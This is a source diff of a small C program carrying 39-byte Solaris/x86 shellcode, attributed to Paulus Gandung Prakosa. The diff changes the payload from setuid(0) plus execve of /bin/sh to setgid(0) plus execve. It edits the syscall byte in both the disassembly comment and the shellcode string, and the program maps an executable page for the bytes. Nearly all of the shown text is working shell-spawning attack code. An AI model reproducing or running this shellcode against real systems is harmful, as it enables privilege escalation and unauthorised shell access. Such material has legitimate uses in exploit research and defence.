@@ -10,7 +10,7 @@
 #include <sys/utsname.h>
 
 /*
- * SunOS (Solaris) / x86 setuid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
+ * SunOS (Solaris) / x86 setgid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
  * 39 bytes shellcode
  *
  * Paulus Gandung Prakosa <gandung@lists.infradead.org>
@@ -24,7 +24,7 @@
  * 805042a:       56                      push   %esi
  * 805042b:       56                      push   %esi
  * 805042c:       33 c0                   xor    %eax,%eax
- * 805042e:       b0 17                   mov    $0x17,%al
+ * 805042e:       b0 2e                   mov    $0x2e,%al
  * 8050430:       50                      push   %eax
  * 8050431:       cd 91                   int    $0x91
  * 8050433:       56                      push   %esi
@@ -55,7 +55,7 @@ int main(int argc, char **argv)
 
 	struct utsname uts;
 	char *pcall;
-	char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
+	char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x2e"
                           "\x50\xcd\x91\x56\x68\x6e\x2f\x73"
                           "\x68\x68\x2f\x2f\x62\x69\x8b\xdc"
                           "\x56\x53\x8b\xcc\x56\x56\x51\x53"
@@ -65,7 +65,7 @@ int main(int argc, char **argv)
 		NULL,
 		sysconf(_SC_PAGESIZE),
 		PROT_WRITE | PROT_EXEC,
-		MAP_ANONYMOUS | MAP_PRIVATE,
+		MAP_PRIVATE | MAP_ANONYMOUS,
 		-1,
 		0
 	);
